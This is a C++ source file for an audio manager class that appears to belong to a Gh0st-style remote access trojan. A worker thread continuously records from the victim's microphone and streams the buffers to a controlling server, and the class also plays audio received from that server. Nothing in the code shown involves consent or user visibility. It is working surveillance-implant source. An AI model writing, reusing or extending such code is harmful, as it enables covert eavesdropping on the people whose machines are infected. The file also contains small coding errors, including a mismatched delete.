#include "stdafx.h"
#include "AudioManager.h"
#include <Mmsystem.h>
#include"Common.h"

CAudioManager::CAudioManager(IOCPClient* ClientObject)
	:CManager(ClientObject)
{
	m_isWorking = FALSE;

	m_AudioObject = NULL;
	
	if (Initialize() == FALSE)
	{
		return;
	}
	BYTE bToken = TOKEN_AUDIO_START;

	m_ClientObject->OnServerSending((char*)&bToken, sizeof(BYTE));
	WaitForDialogOpen();
	m_WorkThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread,
		(LPVOID)this, 0, NULL);
}


CAudioManager::~CAudioManager()
{
	m_isWorking = FALSE;                            //设定工作状态为假
	WaitForSingleObject(m_WorkThreadHandle, INFINITE);    //等待 工作线程结束


	if (m_AudioObject != NULL)
	{
		delete m_AudioObject;
		m_AudioObject = NULL;
	}
}

VOID CAudioManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch (szBuffer[0])
	{
		case COMMAND_NEXT:
		{
			NotifyDialogOpen();
			break;
		}
		default:
		{
			m_AudioObject->PlayBuffer(szBuffer, ulLength);
			break;
			break;
		}
			
	}
}

BOOL CAudioManager::Initialize()
{
	if (!waveInGetNumDevs())
	{
		return FALSE;
	}
	if (m_isWorking == TRUE)
	{
		return FALSE;
	}
	m_AudioObject = new CAudio;
	m_isWorking = TRUE;
	return TRUE;
}

DWORD WINAPI CAudioManager::WorkThread(LPVOID lParam)
{
	CAudioManager* This = (CAudioManager*)lParam;
	while (This->m_isWorking)
	{
		This->SendRecordBuffer();
	}
	return 0;
}

//发送录音
int CAudioManager::SendRecordBuffer()
{
	DWORD dwAudioBufferSize = 0;
	DWORD dwReturn = 0;
	LPBYTE AudioBuffer = m_AudioObject->GetRecordBuffer(&dwAudioBufferSize);

	if (AudioBuffer == NULL)
	{
		return 0;
	}
	LPBYTE szBuffer = new BYTE[dwAudioBufferSize + 1];
	szBuffer[0] = TOKEN_AUDIO_DATA;

	memcpy(szBuffer + 1, AudioBuffer, dwAudioBufferSize);
	

	if (dwAudioBufferSize > 0)
	{
		dwReturn = m_ClientObject->OnServerSending((char*)szBuffer, dwAudioBufferSize + 1);
	}
	delete szBuffer;
	return dwReturn;
}
